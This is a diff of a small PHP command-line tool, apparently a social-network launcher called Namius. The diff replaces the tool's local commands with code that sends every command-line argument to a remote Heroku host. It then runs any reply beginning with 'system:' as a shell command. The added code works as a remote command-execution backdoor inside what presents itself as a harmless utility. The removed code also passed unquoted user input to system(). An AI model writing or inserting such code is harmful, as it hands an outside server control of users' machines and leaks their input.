@@ -1,44 +1,33 @@
 <?php
-if ($argv[1]=='--v') {
-echo "Namius ver: 1.0 Demo\n";
+$req="?";
+$i=1;
+while (1) {
+$req=$req.$i."=".$argv[$i]."&";
+if (isset($argv[$i+1])==0) {
+break;
 }
-else if ($argv[1]=='--help') {
-echo "Синтаксис: ns [команда] [опции]\nСписок команд:\nОткрыть соцсети/Мессенджеры:\nns [название]\nЧтобы увидеть доступные соцсети напишите ns --fs\nЧтобы открыть определенный url, напишите ns url [ваш url]\n"; 
+$i++;
 }
-else if ($argv[1]=='vk') {
-system("firefox vk.com");
+$exit=file_get_contents("https://nscon.herokuapp.com/main.php$req");
+$ex=str_split($exit);
+if ($ex[0].$ex[1].$ex[2].$ex[3].$ex[4].$ex[5].$ex[6]=='system:') {
+$ex[0]='';
+$ex[1]='';
+$ex[2]='';
+$ex[3]='';
+$ex[4]='';
+$ex[5]='';
+$ex[6]='';
+$sys=implode("",$ex);
+system("$sys");
 }
-else if ($argv[1]=='youtube') {
-system("firefox youtube.com");
-}
-else if ($argv[1]=='instagram') {
-system("firefox instagram.com");
-}
-else if ($argv[1]=='namius') {
-system("firefox namius.ru");
-}
-else if ($argv[1]=='url') {
-system("firefox ".$argv[2]);
-}
-else if ($argv[1]=='yandex') {
-system("firefox yandex.ru");
-}
-else if ($argv[1]=='google') {
-system("firefox google.com");
-}
-else if ($argv[1]=='facebook') {
-system("firefox facebook.com");
-}
-else if ($argv[1]=='email') {
-system("firefox mail.ru");
-}
-else if ($argv[1]=='gmail') {
-system("firefox mail.google.com");
-}
-else if ($argv[1]=='--fs') {
-echo "vk, youtube, instagram, facebook, email, gmail, Namius, yandex, google\n";
-}
-else {
-echo "Namius: Unknown command\n";
+if ($ex[0].$ex[1].$ex[2].$ex[3].$ex[4]=='echo:') {
+$ex[0]='';
+$ex[1]='';
+$ex[2]='';
+$ex[3]='';
+$ex[4]='';
+$echo=implode("",$ex);
+echo $echo;
 }
 ?>
